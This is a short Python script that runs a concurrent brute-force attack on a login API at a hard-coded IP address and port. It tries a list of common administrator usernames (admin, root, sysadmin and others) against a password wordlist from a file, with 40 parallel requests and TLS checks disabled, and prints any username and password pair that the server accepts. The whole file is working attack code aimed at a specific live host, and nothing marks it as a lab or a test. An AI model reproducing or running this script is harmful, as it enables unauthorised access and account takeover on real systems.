import asyncio, aiohttp, sys, itertools

BASE="http://38.127.47.105:8082/api/login"
CONC=40

async def attempt(sem, s, user, pwd):
    async with sem:
        try:
            async with s.post(BASE, json={"username":user,"password":pwd}, timeout=12) as r:
                if r.status==200:
                    txt=await r.text()
                    print(f"[!] FOUND {user}:{pwd} -> {txt}", flush=True)
                    return (user,pwd)
        except Exception:
            pass
    return None

async def run(users, pwds):
    sem=asyncio.Semaphore(CONC)
    conn=aiohttp.TCPConnector(limit=CONC, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as s:
        tasks=[create_task(sem,s,u,p) for u in users for p in pwds]
        res=await asyncio.gather(*tasks)
    return [x for x in res if x]

def create_task(sem,s,u,p):
    return asyncio.ensure_future(attempt(sem,s,u,p))

users = ["admin","administrator","root","test","tg","owner","boss","scan","admin1","super","sysadmin"]
pwds = [l.strip() for l in open(sys.argv[1]) if l.strip()]
found=asyncio.run(run(users,pwds))
print("RESULT:", found)
